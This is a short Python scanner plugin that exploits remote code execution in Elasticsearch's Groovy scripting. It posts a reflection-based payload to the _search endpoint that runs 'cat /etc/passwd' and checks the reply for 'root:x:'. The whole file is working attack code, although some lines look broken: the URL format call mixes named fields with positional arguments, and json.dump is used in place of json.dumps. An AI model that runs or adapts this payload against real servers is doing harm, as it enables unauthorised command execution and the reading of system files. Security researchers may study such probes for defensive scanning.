#!/usr/bin/env python
# coding=utf-8


"""
this plugin only used in ip format input. so there i check it 
but, it still can be used in subdomains format 

"""
import re
import requests
import json

class FuzzES(object):
    def __init__(self, ip, port=9200):
        self.ip = ip
        self.port = port 
    
    def runFuzz(self):
        matches = re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", self.ip)
        if not matches:
            return False
        data = {"size":1,"script_fields": {"test#": {"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getInputStream())).readLines()","lang": "groovy"}}}

        url = "http://{ip}:{port}/_search?pretty".format(self.ip, self.port)
        headers = {
            "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36",
            "Connection" : "close"
        }
        try:
            resp = requests.post(url, json.dump(data), headers=headers, timeout=10)
            content = resp.content
            if "root:x:" in content:
                return True
            else:
                return False
            
        except Exception as e:
            return False




        
